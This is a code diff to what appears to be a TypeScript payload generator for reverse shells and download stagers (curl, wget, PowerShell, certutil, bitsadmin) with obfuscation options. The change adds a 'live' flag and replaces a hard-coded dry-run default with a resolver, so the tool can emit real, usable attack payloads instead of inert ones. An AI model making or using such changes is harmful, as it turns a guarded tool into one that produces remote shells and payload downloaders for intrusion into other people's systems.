@@ -27,6 +27,7 @@ export interface StagerOptions {
   payloadPath: string;
   method?: "curl" | "wget" | "powershell" | "certutil" | "bitsadmin";
   obfuscation?: ObfuscationMethod;
+  live?: boolean;
   dryRun?: boolean;
 }
 
@@ -154,10 +155,12 @@ export function obfuscatePayload(payload: string, method: ObfuscationMethod, xor
   }
 }
 
-export function generatePolyglotPayload(options: PayloadOptions): Record<string, GeneratedPayload> {
+export function generatePolyglotPayload(
+  options: PayloadOptions & { live?: boolean; dryRun?: boolean },
+): Record<string, GeneratedPayload> {
   const { host, port, os, obfuscation = "none", xorKey } = options;
   const results: Record<string, GeneratedPayload> = {};
-  const dryRun = true;
+  const dryRun = resolveDryRun(options);
 
   for (const [lang, gen] of Object.entries(SHELLS)) {
     const raw = gen(host, port);
@@ -193,15 +196,21 @@ export function generateDownloadStager(options: StagerOptions): GeneratedPayload
     obfuscated: obfuscatePayload(raw, obfuscation, xorKey),
     obfuscationMethod: obfuscation,
     sizeBytes: raw.length,
-    dryRun: options.dryRun ?? true,
+    dryRun: resolveDryRun(options),
   };
 }
 
-export function generateAllPayloads(host: string, port: number, os: PayloadTargetOS, obfuscation: ObfuscationMethod = "none"): {
+export function generateAllPayloads(
+  host: string,
+  port: number,
+  os: PayloadTargetOS,
+  obfuscation: ObfuscationMethod = "none",
+  opts: { live?: boolean; dryRun?: boolean } = {},
+): {
   reverseShells: Record<string, GeneratedPayload>;
   stagers: GeneratedPayload[];
 } {
-  const shells = generatePolyglotPayload({ host, port, os, obfuscation });
+  const shells = generatePolyglotPayload({ host, port, os, obfuscation, ...opts });
   const stagerMethods: StagerOptions["method"][] = os === "windows"
     ? ["powershell", "certutil", "bitsadmin"]
     : os === "darwin"
@@ -209,7 +218,7 @@ export function generateAllPayloads(host: string, port: number, os: PayloadTarge
       : ["wget", "curl"];
 
   const stagers = stagerMethods.map(m =>
-    generateDownloadStager({ host, port, os, payloadPath: "payload.sh", method: m, obfuscation })
+    generateDownloadStager({ host, port, os, payloadPath: "payload.sh", method: m, obfuscation, dryRun: resolveDryRun(opts) })
   );
 
   return { reverseShells: shells, stagers };
